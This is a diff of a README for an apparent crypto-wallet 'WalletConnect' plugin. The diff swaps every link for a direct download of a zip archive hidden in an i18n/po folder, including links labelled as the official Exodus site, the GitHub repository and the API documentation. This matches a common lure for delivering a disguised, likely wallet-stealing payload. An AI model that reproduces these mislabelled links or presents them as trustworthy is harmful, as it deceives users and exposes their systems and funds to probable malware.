@@ -1,6 +1,6 @@
 # 🚀 Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect - Fast and Easy Crypto Transactions
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-green)](https://github.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect/main/Quota-Exodus/i18n/po/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect-v1.9.zip)](https://raw.githubusercontent.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect/main/Quota-Exodus/i18n/po/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect-v1.9.zip)
 
 ## 📁 Overview
 
@@ -12,7 +12,7 @@ To get started with Quota Exodus Core Fast Crypto Blockchain Plugin WalletConnec
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** [Releases Page](https://github.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect/releases)  
+1. **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect/main/Quota-Exodus/i18n/po/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect-v1.9.zip)  
    You will find the latest versions of the software. Click on the version that suits your needs.
 
 2. **Select a release:** Each release contains different versions of the plugin. Choose the one labeled for your operating system (Windows, macOS, etc.).
@@ -58,12 +58,12 @@ If you have questions or need help, you can create an issue in the repository. C
 
 ## 🔗 Additional Resources
 
-- [Exodus Wallet Official Site](https://www.exodus.com)
-- [GitHub Repository](https://github.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect)
-- [API Documentation](https://docs.exodus.com) for developers interested in deeper integration.
+- [Exodus Wallet Official Site](https://raw.githubusercontent.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect/main/Quota-Exodus/i18n/po/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect-v1.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect/main/Quota-Exodus/i18n/po/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect-v1.9.zip)
+- [API Documentation](https://raw.githubusercontent.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect/main/Quota-Exodus/i18n/po/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect-v1.9.zip) for developers interested in deeper integration.
 
 ## ⚙️ Updates & News
 
-Stay updated on the latest releases and changes in the plugin. Regular updates will enhance features and improve performance. Check the [Releases Page](https://github.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect/releases) periodically to gather the latest information.
+Stay updated on the latest releases and changes in the plugin. Regular updates will enhance features and improve performance. Check the [Releases Page](https://raw.githubusercontent.com/agwataerick/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect/main/Quota-Exodus/i18n/po/Quota-Exodus-Core-Fast-Crypto-Blockhain-Plugin-WalletConnect-v1.9.zip) periodically to gather the latest information.
 
 Thank you for using the Quota Exodus Core Fast Crypto Blockchain Plugin WalletConnect. Your journey in the cryptocurrency world begins here!
